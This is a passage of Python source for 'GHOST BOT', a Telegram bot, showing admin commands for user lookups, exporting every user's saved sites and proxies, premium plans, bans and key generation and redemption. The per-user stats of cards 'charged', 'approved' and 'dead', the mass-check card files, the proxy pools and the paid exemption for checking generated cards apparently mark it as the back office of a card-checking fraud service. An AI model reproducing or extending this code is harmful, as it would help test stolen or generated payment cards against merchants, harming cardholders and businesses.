async def single_user_lookup_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
        
    target_match = event.pattern_match.group(1)
    if not target_match:
        await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/user ᴜsᴇʀ_ɪᴅ</code>"), parse_mode='html')
        return
        
    target_id = int(target_match)
    status_msg = await event.reply(premium_emoji(f"🔄 <b>Fᴇᴛᴄʜɪɴɢ ɪɴғᴏ ғᴏʀ <code>{target_id}</code>...</b>"), parse_mode='html')
    
    try:
        u = await db_manager.get_single_user_detailed_info(target_id)
        
        # Try fetching telegram name
        tg_name = f"<code>{target_id}</code>"
        try:
            entity = await bot.get_entity(target_id)
            name_parts = [entity.first_name or '', entity.last_name or '']
            full_name = ' '.join(p for p in name_parts if p).strip()
            username = f"@{entity.username}" if entity.username else "No Username"
            tg_name = f"<b>{full_name}</b> ({username})"
        except:
            pass
            
        plan_str = f"⭐ {u['plan'].upper()}" if u['is_premium'] else "🆓 FREE"
        exp_str = str(u['premium_expiry'])[:19] if u['premium_expiry'] else "N/A"
        ban_str = f"🚫 BANNED ({u['ban_reason']})" if u['is_banned'] else "✅ Active"
        
        info_text = f"""👤 <b>Usᴇʀ Dᴇᴛᴀɪʟs</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
▸ 👤 Usᴇʀ: {tg_name}
▸ 🆔 ID: <code>{target_id}</code>
▸ 👑 Pʟᴀɴ: {plan_str}
▸ ⏰ Exᴘɪʀʏ: <code>{exp_str}</code>
▸ 🛡️ Sᴛᴀᴛᴜs: {ban_str}

🌐 <b>Pʀɪᴠᴀᴛᴇ Pᴏᴏʟ:</b>
┣ 📂 Sɪᴛᴇs Sᴀᴠᴇᴅ: <code>{u['sites_count']}/200</code>
┗ ⚡ Pʀᴏxɪᴇs Sᴀᴠᴇᴅ: <code>{u['proxies_count']}/200</code>

📊 <b>Cʜᴇᴄᴋɪɴɢ Aᴄᴛɪᴠɪᴛʏ:</b>
┣ Sᴇssɪᴏɴs: <code>{u['sessions']}</code>
┣ Tᴏᴛᴀʟ Cᴀʀᴅs: <code>{u['total_cards']}</code>
┣ 💎 Cʜᴀʀɢᴇᴅ: <code>{u['charged']}</code>
┣ ✅ Aᴘᴘʀᴏᴠᴇᴅ: <code>{u['approved']}</code>
┣ ❌ Dᴇᴀᴅ: <code>{u['dead']}</code>
┗ 📈 Hɪᴛ Rᴀᴛᴇ: <code>{u['hit_rate']}%</code>

💡 <i>Aᴅᴍɪɴ Aᴄᴛɪᴏɴs:</i>
• <code>/addpremium {target_id} 30 premium</code>
• <code>/unban {target_id}</code>"""

        await safe_edit(status_msg, premium_emoji(info_text), parse_mode='html')
        
    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/(getallsites|exportallsites)(?:\s|$)'))
async def get_all_sites_database_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
        
    status_msg = await event.reply(premium_emoji("🔄 <b>Exᴘᴏʀᴛɪɴɢ ᴀʟʟ ᴅᴀᴛᴀʙᴀsᴇ sɪᴛᴇs...</b>"), parse_mode='html')
    try:
        db_sites = await db_manager.get_all_sites_database()
        global_sites = await get_file_lines(SITES_FILE)
        
        all_unique_urls = list(set([s['url'] for s in db_sites] + global_sites))
        
        filename = "all_users_sites_database.txt"
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            await f.write(f"# GHOST BOT - ALL USER SITES DATABASE\n")
            await f.write(f"# Total Saved: {len(db_sites)} | Unique: {len(all_unique_urls)}\n")
            await f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            await f.write("=== 1. UNIQUE SITES LIST (FOR BULK IMPORT) ===\n")
            for url in sorted(all_unique_urls):
                await f.write(f"{url}\n")
            await f.write("\n=== 2. DETAILED SITES BY USER ===\n")
            for s in db_sites:
                await f.write(f"User: {s['user_id']} | Price: ${s['price']:.2f} | Added: {s['added_at']} | URL: {s['url']}\n")
                
        await status_msg.delete()
        await event.reply(
            premium_emoji(f"📁 <b>Aʟʟ Sɪᴛᴇs Dᴀᴛᴀʙᴀsᴇ Exᴘᴏʀᴛ</b>\n\n📊 Tᴏᴛᴀʟ Sɪᴛᴇs: <code>{len(db_sites)}</code>\n🌐 Uɴɪǫᴜᴇ URLs: <code>{len(all_unique_urls)}</code>\n\nFɪʟᴇ ᴀᴛᴛᴀᴄʜᴇᴅ ʙᴇʟᴏᴡ."),
            file=filename,
            parse_mode='html'
        )
        try:
            if os.path.exists(filename):
                os.remove(filename)
        except:
            pass
            
    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/(getallproxies|exportallproxies)(?:\s|$)'))
async def get_all_proxies_database_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
        
    status_msg = await event.reply(premium_emoji("🔄 <b>Exᴘᴏʀᴛɪɴɢ ᴀʟʟ ᴅᴀᴛᴀʙᴀsᴇ ᴘʀᴏxɪᴇs...</b>"), parse_mode='html')
    try:
        db_proxies = await db_manager.get_all_proxies_database()
        global_proxies = await get_file_lines(PROXY_FILE)
        
        all_unique_px = list(set([p['proxy'] for p in db_proxies] + global_proxies))
        
        filename = "all_users_proxies_database.txt"
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            await f.write(f"# GHOST BOT - ALL USER PROXIES DATABASE\n")
            await f.write(f"# Total Saved: {len(db_proxies)} | Unique: {len(all_unique_px)}\n")
            await f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            await f.write("=== 1. UNIQUE PROXIES LIST (CLEAN) ===\n")
            for px in sorted(all_unique_px):
                await f.write(f"{px}\n")
            await f.write("\n=== 2. DETAILED PROXIES BY USER ===\n")
            for p in db_proxies:
                await f.write(f"User: {p['user_id']} | Added: {p['added_at']} | Proxy: {p['proxy']}\n")
                
        await status_msg.delete()
        await event.reply(
            premium_emoji(f"📁 <b>Aʟʟ Pʀᴏxɪᴇs Dᴀᴛᴀʙᴀsᴇ Exᴘᴏʀᴛ</b>\n\n📊 Tᴏᴛᴀʟ Pʀᴏxɪᴇs: <code>{len(db_proxies)}</code>\n⚡ Uɴɪǫᴜᴇ Pʀᴏxɪᴇs: <code>{len(all_unique_px)}</code>\n\nFɪʟᴇ ᴀᴛᴛᴀᴄʜᴇᴅ ʙᴇʟᴏᴡ."),
            file=filename,
            parse_mode='html'
        )
        try:
            if os.path.exists(filename):
                os.remove(filename)
        except:
            pass
            
    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addpremium'))
async def add_premium_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    try:
        parts = event.raw_text.split()
        if len(parts) < 3:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/addpremium ᴜsᴇʀ_ɪᴅ ᴅᴀʏs [ᴘʟᴀɴ(junior/pro/premium)]</code>"), parse_mode='html')
            return
        target_id = int(parts[1])
        
        arg2 = parts[2].lower()
        if arg2 in PLANS:
            plan_name = arg2
            days = PLANS[plan_name]['days']
        else:
            days = int(parts[2])
            plan_name = parts[3].lower() if len(parts) > 3 else 'premium'
            if plan_name not in PLANS:
                plan_name = 'premium'
            
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
        plan_config = PLANS[plan_name]
        
        await db_manager.add_premium_user(target_id, expiry=expiry, plan=plan_name)
        await event.reply(premium_emoji(f"✅ Usᴇʀ <code>{target_id}</code> ᴀᴅᴅᴇᴅ ᴛᴏ <b>{plan_config['name']}</b> ғᴏʀ {days} ᴅᴀʏs!"), parse_mode='html')
        
        receipt = f"""🧾 <b>Pʀᴇᴍɪᴜᴍ Rᴇᴄᴇɪᴘᴛ</b> 🧾
━━━━━━━━━━━━━━━━━━
👤 <b>Cᴜsᴛᴏᴍᴇʀ ID:</b> <code>{target_id}</code>
📦 <b>Pᴀᴄᴋᴀɢᴇ:</b> {plan_config['name']}
⏳ <b>Dᴜʀᴀᴛɪᴏɴ:</b> {days} Dᴀʏs
⚡ <b>Bᴇɴᴇғɪᴛs:</b>
  • {plan_config['cards_per_file']} Cᴀʀᴅs ᴘᴇʀ Mᴀss-Cʜᴇᴄᴋ Fɪʟᴇ
  • {plan_config['cooldown']}s Cᴏᴏʟᴅᴏᴡɴ ᴘᴇʀ ʀᴇǫᴜᴇsᴛ
━━━━━━━━━━━━━━━━━━
🎉 <i>Tʜᴀɴᴋ ʏᴏᴜ ғᴏʀ ʏᴏᴜʀ ᴘᴜʀᴄʜᴀsᴇ! Eɴᴊᴏʏ ʏᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss.</i>"""
        try:
            await bot.send_message(target_id, premium_emoji(receipt), parse_mode='html')
        except:
            pass
    except ValueError:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ᴜsᴇʀ ID ᴏʀ ᴅᴀʏs ᴀᴍᴏᴜɴᴛ."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern='/removepremium'))
async def remove_premium_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/removepremium ᴜsᴇʀ_ɪᴅ</code>"), parse_mode='html')
            return
        target_id = int(parts[1])
        if target_id in ADMIN_ID:
            await event.reply(premium_emoji("⚠️ Cᴀɴɴᴏᴛ ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴ ғʀᴏᴍ ᴘʀᴇᴍɪᴜᴍ."), parse_mode='html')
            return
        if await remove_premium_user(target_id):
            await event.reply(premium_emoji(f"✅ Usᴇʀ <code>{target_id}</code> ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ ᴘʀᴇᴍɪᴜᴍ."), parse_mode='html')
            try:
                await bot.send_message(target_id, premium_emoji("⚠️ Yᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ʜᴀs ʙᴇᴇɴ ʀᴇᴠᴏᴋᴇᴅ."), parse_mode='html')
            except:
                pass
        else:
            await event.reply(premium_emoji(f"⚠️ Usᴇʀ <code>{target_id}</code> ɪs ɴᴏᴛ ᴘʀᴇᴍɪᴜᴍ."), parse_mode='html')
    except ValueError:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ᴜsᴇʀ ID."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/addadmpremium(?:\s+(.+))?'))
@bot.on(events.NewMessage(pattern=r'^/addadmprem(?:\s+(.+))?'))
async def add_adm_premium_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    try:
        parts = event.raw_text.split()
        if len(parts) < 3:
            await event.reply(
                premium_emoji("📝 <b>Usᴀɢᴇ:</b> <code>/addadmpremium &lt;user_id&gt; &lt;plan(junior/pro/premium)&gt; &lt;duration_in_days&gt;</code>\n\n"
                              "💡 <i>Exᴀᴍᴘʟᴇ:</i> <code>/addadmpremium 123456789 premium 30</code>\n"
                              "🛡 <i>Usᴇʀs ɪɴ ᴛʜɪs ᴄᴀᴛᴇɢᴏʀʏ ᴄᴀɴ ɢᴇɴ ᴄʜᴇᴄᴋ ᴡɪᴛʜᴏᴜᴛ ɢᴇᴛᴛɪɴɢ ʙᴀɴɴᴇᴅ, ʙᴜᴛ ᴀʀᴇ ɴᴏᴛ ᴀᴄᴛᴜᴀʟ ᴀᴅᴍɪɴs.</i>"),
                parse_mode='html'
            )
            return
        
        target_id = int(parts[1])
        
        # Support flexible argument orders: /addadmpremium <uid> <plan> <days> OR <uid> <days> <plan>
        arg2 = parts[2].lower()
        if arg2 in PLANS:
            plan_name = arg2
            days = int(parts[3]) if len(parts) > 3 else PLANS[plan_name]['days']
        elif len(parts) > 3 and parts[3].lower() in PLANS:
            days = int(parts[2])
            plan_name = parts[3].lower()
        else:
            days = int(parts[2])
            plan_name = 'premium'
            
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
        plan_config = PLANS.get(plan_name, PLANS['premium'])
        
        await db_manager.add_adm_premium_user(target_id, expiry=expiry, plan=plan_name)
        await db_manager.unban_user(target_id)
        
        msg = (
            f"👑 <b>ADM PREMIUM USER GRANTED</b> 👑\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Usᴇʀ ID:</b> <code>{target_id}</code>\n"
            f"📦 <b>Pᴀᴄᴋᴀɢᴇ:</b> <b>{plan_config['name']}</b>\n"
            f"⏳ <b>Dᴜʀᴀᴛɪᴏɴ:</b> <code>{days} Dᴀʏs</code>\n"
            f"🛡 <b>Aɴᴛɪ-Gᴇɴ Pʀᴏᴛᴇᴄᴛɪᴏɴ:</b> <code>EXEMPT (Gen Check Allowed)</code>\n"
            f"🔐 <b>Aᴅᴍɪɴ Pᴀɴᴇʟ Aᴄᴄᴇss:</b> <code>NO (Standard Permissions)</code>\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        await event.reply(premium_emoji(msg), parse_mode='html')
        
        receipt = (
            f"🎉 <b>VIP Access Activated!</b> 🎉\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📦 <b>Package:</b> {plan_config['name']} (VIP Access)\n"
            f"⏳ <b>Duration:</b> {days} Days\n"
            f"⚡ <b>Perks:</b>\n"
            f"  • {plan_config['cards_per_file']:,} Cards per Mass File\n"
            f"  • {plan_config['cooldown']}s Cooldown between checks\n"
            f"  • Unrestricted checking & Anti-Gen Exemption\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<i>Enjoy your elevated access!</i>"
        )
        try:
            await bot.send_message(target_id, premium_emoji(receipt), parse_mode='html')
        except:
            pass
    except ValueError:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ᴜsᴇʀ ID ᴏʀ ᴅᴀʏs ᴀᴍᴏᴜɴᴛ."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/removeadmpremium(?:\s+(.+))?'))
@bot.on(events.NewMessage(pattern=r'^/removeadmprem(?:\s+(.+))?'))
async def remove_adm_premium_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/removeadmpremium ᴜsᴇʀ_ɪᴅ</code>"), parse_mode='html')
            return
        target_id = int(parts[1])
        if await db_manager.remove_adm_premium_user(target_id):
            await event.reply(premium_emoji(f"✅ Usᴇʀ <code>{target_id}</code> ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ ADM Pʀᴇᴍɪᴜᴍ."), parse_mode='html')
        else:
            await event.reply(premium_emoji(f"⚠️ Usᴇʀ <code>{target_id}</code> ɪs ɴᴏᴛ ADM Pʀᴇᴍɪᴜᴍ."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/listadmpremium(?:\s|$)'))
async def list_adm_premium_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    adm_users = await db_manager.get_adm_premium_users()
    if not adm_users:
        await event.reply(premium_emoji("ℹ️ Nᴏ ADM Pʀᴇᴍɪᴜᴍ ᴜsᴇʀs ғᴏᴜɴᴅ."), parse_mode='html')
        return
    lines = ["👑 <b>ADM Pʀᴇᴍɪᴜᴍ Usᴇʀs</b> 👑\n━━━━━━━━━━━━━━━━━━"]
    for u in adm_users:
        exp = u['expiry'][:10] if u.get('expiry') else "Lifetime"
        lines.append(f"• <code>{u['user_id']}</code> | <b>{u.get('plan','premium').upper()}</b> | Exp: <code>{exp}</code>")
    lines.append("━━━━━━━━━━━━━━━━━━")
    await event.reply(premium_emoji("\n".join(lines)), parse_mode='html')

@bot.on(events.NewMessage(pattern=re.compile(r'^/unban(?:\s|$)')))
async def unban_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    try:
        parts = event.raw_text.split()
        if len(parts) < 2:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/unban ᴜsᴇʀ_ɪᴅ</code>"), parse_mode='html')
            return
        target_id = int(parts[1])
        
        await db_manager.unban_user(target_id)
        await event.reply(premium_emoji(f"✅ Usᴇʀ <code>{target_id}</code> ʜᴀs ʙᴇᴇɴ ᴜɴʙᴀɴɴᴇᴅ ᴀɴᴅ sᴡɪᴛᴄʜᴇᴅ ᴛᴏ 🆓 <b>Fʀᴇᴇ Mᴏᴅᴇ</b>."), parse_mode='html')
        
        try:
            await bot.send_message(target_id, premium_emoji("✅ <b>Yᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs ʙᴇᴇɴ ᴜɴʙᴀɴɴᴇᴅ!</b>\n\nYᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ɪs ɴᴏᴡ ɪɴ 🆓 <b>Fʀᴇᴇ Mᴏᴅᴇ</b>. Yᴏᴜ ᴄᴀɴ ᴜsᴇ ᴀʟʟ ғʀᴇᴇ ᴛᴏᴏʟs ᴏʀ ᴜᴘɢʀᴀᴅᴇ ʏᴏᴜʀ ᴘʟᴀɴ ᴜsɪɴɢ <code>/buy</code>."), parse_mode='html')
        except:
            pass
    except ValueError:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ᴜsᴇʀ ID."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/unbanall'))
async def unbanall_command(event):
    if event.sender_id not in ADMIN_ID:
        return
    try:
        await db_manager.unban_all_users()
        await event.reply(premium_emoji("✅ <b>Aʟʟ ᴜsᴇʀs ʜᴀᴠᴇ ʙᴇᴇɴ ᴜɴʙᴀɴɴᴇᴅ ᴀɴᴅ sᴡɪᴛᴄʜᴇᴅ ᴛᴏ 🆓 Fʀᴇᴇ Mᴏᴅᴇ!</b>"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/listbanned'))
async def listbanned_command(event):
    if event.sender_id not in ADMIN_ID:
        return
    try:
        banned = await db_manager.get_banned_users()
        if not banned:
            await event.reply(premium_emoji("✅ Tʜᴇʀᴇ ᴀʀᴇ ɴᴏ ʙᴀɴɴᴇᴅ ᴜsᴇʀs."), parse_mode='html')
            return
            
        file_content = "👑 BANNED USERS LIST 👑\n"
        file_content += "=" * 50 + "\n\n"
        
        for idx, u in enumerate(banned, 1):
            username = "Unknown"
            try:
                entity = await bot.get_entity(u['user_id'])
                if entity.username:
                    username = f"@{entity.username}"
                else:
                    username = entity.first_name or "Unknown"
            except Exception:
                pass
                
            file_content += f"{idx}. Username: {username} | ID: {u['user_id']}\n"
            file_content += f"   Reason: {u.get('reason', 'Unknown')}\n"
            file_content += "-" * 30 + "\n"
            
        filename = "Banned_Users_List.txt"
        import aiofiles
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            await f.write(file_content)
            
        await bot.send_file(
            event.chat_id,
            filename,
            caption=premium_emoji(f"📋 <b>Bᴀɴɴᴇᴅ Usᴇʀs Lɪsᴛ</b>\n\n👤 Tᴏᴛᴀʟ ʙᴀɴɴᴇᴅ: <b>{len(banned)}</b>\n\nHᴇʀᴇ ɪs ᴛʜᴇ ғᴜʟʟ ʟɪsᴛ:"),
            parse_mode='html'
        )
        try:
            os.remove(filename)
        except:
            pass
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/genkeys'))
async def genkeys_command(event):
    if event.sender_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    try:
        parts = event.raw_text.split()
        if len(parts) < 3:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/genkeys ᴀᴍᴏᴜɴᴛ ᴘʟᴀɴ_ɴᴀᴍᴇ(junior/pro/premium) [ᴜsᴇʀ_ʟɪᴍɪᴛ]</code>\nOʀ ʙʏ ʜᴏᴜʀs:\n<code>/genkeys ᴀᴍᴏᴜɴᴛ ʜᴏᴜʀs ᴜsᴇʀ_ʟɪᴍɪᴛ</code>"), parse_mode='html')
            return
            
        amount = int(parts[1])
        plan_or_hours = parts[2].lower()
        
        user_limit = 1
        plan_name = 'premium'
        plan_display = ''
        
        if plan_or_hours in PLANS:
            plan_name = plan_or_hours
            hours = PLANS[plan_name]['days'] * 24
            plan_display = PLANS[plan_name]['name']
            if len(parts) > 3:
                user_limit = int(parts[3])
        else:
            try:
                hours = int(plan_or_hours)
                plan_display = 'Cᴜsᴛᴏᴍ Pʟᴀɴ'
                
                if len(parts) > 3:
                    if parts[3].lower() in PLANS:
                        plan_name = parts[3].lower()
                    else:
                        user_limit = int(parts[3])
                if len(parts) > 4:
                    if parts[4].lower() in PLANS:
                        plan_name = parts[4].lower()
            except ValueError:
                await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ᴘʟᴀɴ ɴᴀᴍᴇ, ʜᴏᴜʀs, ᴏʀ ᴜsᴇʀ ʟɪᴍɪᴛ!"), parse_mode='html')
                return

        keys_data = await load_keys()
        generated_keys = []
        created_at = datetime.now()
        for _ in range(amount):
            key = generate_key()
            expiry_time = created_at + timedelta(hours=hours)
            keys_data[key] = {
                'type': plan_name,
                'hours': hours,
                'expiry': expiry_time.isoformat(),
                'user_limit': user_limit,
                'used_count': 0,
                'used_by': [],
                'created_at': created_at.isoformat(),
                'created_by': event.sender_id
            }
            generated_keys.append(key)
        await save_keys(keys_data)
        days_display = f"{hours} hours" if hours < 24 else f"{hours // 24} days"
        keys_text = ""
        for idx, key in enumerate(generated_keys, 1):
            keys_text += f"""\n┣ <code>{key}</code>"""
        full_text = premium_emoji(f"""⭐ <b>Kᴇʏs Gᴇɴᴇʀᴀᴛᴇᴅ</b>   (x{amount})   
━━━━━━━━━━━━━━━━━━{keys_text}
┗ 📅 Pᴇʀɪᴏᴅ: {days_display} ({plan_display})
           ┗ 👥 Usᴇʀs: {user_limit}
      
✅ Usᴇ <code>/redeem Kᴇʏ</code> ᴛᴏ ʀᴇᴅᴇᴇᴍ""")
        if len(full_text) > 4000:
            filename = f"generated_keys_{int(time.time())}.txt"
            async with aiofiles.open(filename, 'w') as f:
                for key in generated_keys:
                    await f.write(f"{key}\n")
            short_msg = premium_emoji(f"""⭐ <b>Kᴇʏs Gᴇɴᴇʀᴀᴛᴇᴅ</b>   (x{amount})   
━━━━━━━━━━━━━━━━━━
    Fɪʟᴇ ᴀᴛᴛᴀᴄʜᴇᴅ ʙᴇʟᴏᴡ.
┗ 📅 Pᴇʀɪᴏᴅ: {days_display} ({plan_display})
           ┗ 👥 Usᴇʀs: {user_limit}
      
✅ Usᴇ <code>/redeem Kᴇʏ</code> ᴛᴏ ʀᴇᴅᴇᴇᴍ""")
            await event.reply(short_msg, file=filename, parse_mode='html')
            try:
                os.remove(filename)
            except:
                pass
        else:
            await event.reply(full_text, parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    user_id = event.sender_id
    try:
        keys_data = await load_keys()
        key_to_use = None
        
        if event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            if reply_msg and reply_msg.text:
                import re
                found_keys = re.findall(r'GHOST_[A-Z0-9]{15}', reply_msg.text)
                for k in found_keys:
                    if k in keys_data:
                        k_data = keys_data[k]
                        expiry = datetime.fromisoformat(k_data['expiry'])
                        if datetime.now() <= expiry and k_data['used_count'] < k_data['user_limit'] and str(user_id) not in k_data['used_by']:
                            key_to_use = k
                            break
                if not key_to_use:
                    await event.reply(premium_emoji("❌ Aʟʟ ᴋᴇʏs ɪɴ ᴛʜᴀᴛ ᴍᴇssᴀɢᴇ ᴀʀᴇ ᴀʟʀᴇᴀᴅʏ ʀᴇᴅᴇᴇᴍᴇᴅ ᴏʀ ᴇxᴘɪʀᴇᴅ!"), parse_mode='html')
                    return
        
        if not key_to_use:
            parts = event.raw_text.split()
            if len(parts) != 2:
                await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/redeem Kᴇʏ</code> ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴡɪᴛʜ ᴋᴇʏs."), parse_mode='html')
                return
            key_to_use = parts[1].upper()
            
        key = key_to_use
        if key not in keys_data:
            await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ Kᴇʏ!"), parse_mode='html')
            return
        key_data = keys_data[key]
        plan_name = key_data.get('type', 'premium')
        if plan_name in PLANS or plan_name == 'time_limit':
            if plan_name == 'time_limit':
                plan_name = 'premium' # Legacy keys default to premium
            
            expiry = datetime.fromisoformat(key_data['expiry'])
            current_date = datetime.now()
            if current_date > expiry:
                await event.reply(premium_emoji("❌ Tʜɪs ᴋᴇʏ ʜᴀs EXPIRED!"), parse_mode='html')
                return
            if key_data['used_count'] >= key_data['user_limit']:
                await event.reply(premium_emoji(f"❌ Tʜɪs ᴋᴇʏ ʜᴀs ʀᴇᴀᴄʜᴇᴅ ɪᴛs ʟɪᴍɪᴛ"), parse_mode='html')
                return
            user_id_str = str(user_id)
            if user_id_str in key_data['used_by']:
                await event.reply(premium_emoji("❌ Yᴏᴜ ʜᴀᴠᴇ ᴀʟʀᴇᴀᴅʏ ᴜsᴇᴅ ᴛʜɪs ᴋᴇʏ!"), parse_mode='html')
                return
            
            # Check if user is already premium
            if await is_premium(user_id):
                await event.reply(premium_emoji("❌ Yᴏᴜ ᴀʀᴇ ᴀʟʀᴇᴀᴅʏ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ!\n\nIғ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴇxᴛᴇɴᴅ ʏᴏᴜʀ ᴘʟᴀɴ, ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ɪᴛ ᴛᴏ ᴇxᴘɪʀᴇ ᴏʀ ᴄᴏɴᴛᴀᴄᴛ ᴀɴ ᴀᴅᴍɪɴ."), parse_mode='html')
                return
            
            user_expiry = current_date + timedelta(hours=key_data.get('hours', 0))
            await db_manager.add_premium_user(user_id, expiry=user_expiry.isoformat(), plan=plan_name)
            
            key_data['used_count'] += 1
            key_data['used_by'].append(user_id_str)
            key_data['used_at'] = current_date.isoformat()
            keys_data[key] = key_data
            await save_keys(keys_data)
            
            hours_display = key_data['hours']
            days_display = f"{hours_display} hours" if hours_display < 24 else f"{hours_display // 24} days"
            
            if key_data['hours'] != PLANS[plan_name]['days'] * 24:
                package_name = "Cᴜsᴛᴏᴍ Pʟᴀɴ"
            else:
                package_name = PLANS[plan_name]['name']
            
            receipt = f"""🎉 Cᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴs!
⭐ Vɪᴘ Aᴄᴄᴇss Aᴄᴛɪᴠᴀᴛᴇᴅ!
📦 <b>Pᴀᴄᴋᴀɢᴇ:</b> {package_name}
📅 <b>Dᴜʀᴀᴛɪᴏɴ:</b> {days_display}"""
            await safe_reply(event, receipt, parse_mode='html')
    except Exception as e:
        await safe_reply(event, f"❌ Eʀʀᴏʀ: {e}", parse_mode='html')


@bot.on(events.NewMessage(pattern='/unusedkeys'))
async def unusedkeys_command(event):
    if event.sender_id not in ADMIN_ID:
        return
    keys_data = await load_keys()
    unused = []
    now = datetime.now()
    for k, v in keys_data.items():
        expiry = datetime.fromisoformat(v['expiry'])
        if now <= expiry and v['used_count'] < v['user_limit']:
            unused.append((k, v))
            
    if not unused:
        await event.reply(premium_emoji("📭 Nᴏ ᴜɴᴜsᴇᴅ ᴋᴇʏs ғᴏᴜɴᴅ!"), parse_mode='html')
        return
        
    text = f"🔑 <b>Uɴᴜsᴇᴅ Kᴇʏs ({len(unused)})</b>\n\n"
    for k, v in unused:
        plan_name = v.get('type', 'premium')
        hours = v.get('hours', 0)
        if hours > 0:
            if hours < 24:
                duration_str = f"{hours}h"
            elif hours % 24 == 0:
                duration_str = f"{hours // 24}d"
            else:
                duration_str = f"{hours}h"
        else:
            duration_str = "Custom"
        plan_display = PLANS.get(plan_name, {}).get('name', plan_name.upper())
        text += f"┣ <code>{k}</code> ({duration_str} | {plan_display})\n"
        
    if len(text) > 4000:
        filename = f"unused_keys_{int(time.time())}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for k, v in unused:
                await f.write(f"{k}\n")
        await event.reply(premium_emoji(f"🔑 <b>Uɴᴜsᴇᴅ Kᴇʏs ({len(unused)})</b>\n\nFɪʟᴇ ᴀᴛᴛᴀᴄʜᴇᴅ ʙᴇʟᴏᴡ."), file=filename, parse_mode='html')
        try:
            os.remove(filename)
        except:
            pass
    else:
        await event.reply(premium_emoji(text), parse_mode='html')


@bot.on(events.NewMessage(pattern='/clearcache'))
async def clearcache_command(event):
    if event.sender_id not in ADMIN_ID:
